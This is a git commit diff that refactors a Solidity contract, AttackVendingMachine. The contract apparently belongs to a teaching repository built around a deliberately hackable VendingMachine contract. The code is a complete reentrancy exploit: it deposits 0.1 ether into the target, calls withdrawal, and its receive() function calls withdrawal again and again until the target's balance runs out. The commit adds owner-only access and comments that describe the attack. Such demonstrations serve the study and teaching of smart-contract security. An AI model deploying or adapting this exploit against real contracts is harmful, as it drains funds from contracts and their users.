7072432a49ed6fe88e2570b976f89617029bd25b
Aniekwe Joshua <joshuaaniekwe@gmail.com>
2022-06-08 16:54:05 +0100

    Refactor AttackVendingMachine.sol contract code

--- contracts/AttackVendingMachine.sol
+++ contracts/AttackVendingMachine.sol
@@ -1,29 +1,60 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity ^0.8.9;
+pragma solidity >=0.7.0 <0.9.0;
 
+// import "https://github.com/sir-josh/Hackable-smart-contract/blob/master/contracts/VendingMachine.sol";
 import "./VendingMachine.sol";
+import "hardhat/console.sol";
 
 contract AttackVendingMachine{
     VendingMachine public vendingMachine;
+    address public owner;
 
+
+    /**
+     * @dev Sets the values for {owner}, initialize {vendingMachine} with
+     * the address of target contract to attack
+     */
     constructor(address _vendingMachineAddress){  
         vendingMachine = VendingMachine(_vendingMachineAddress);
+        owner = msg.sender;
     }
 
+     /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Restricted call: caller is not the owner");
+        _;
+    }
+
+    /**
+     * @dev uses re-entrancy to continue withdrawing from the target contract.
+     *
+     */
     receive() external payable{
          if(address(vendingMachine).balance >= 0.1 ether){
             vendingMachine.withdrawal();
         }
     }
 
-    function attackContract() public payable{
+    /**
+     * @dev launches attact on the target contract.
+     *
+     * Requirements:
+     *
+     * - The attacker will have deposit at least 0.1 ether to the target victim contract before the attact would hold
+     */
+    function attackContract() public payable onlyOwner{
         require(msg.value >= 0.1 ether, "Requires at least 0.1 ether to launch an attack");
         vendingMachine.deposit{value: 0.1 ether}();
 
         vendingMachine.withdrawal();
     }
 
+    /**
+     * @dev Returns the balance of the contract.
+     */
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
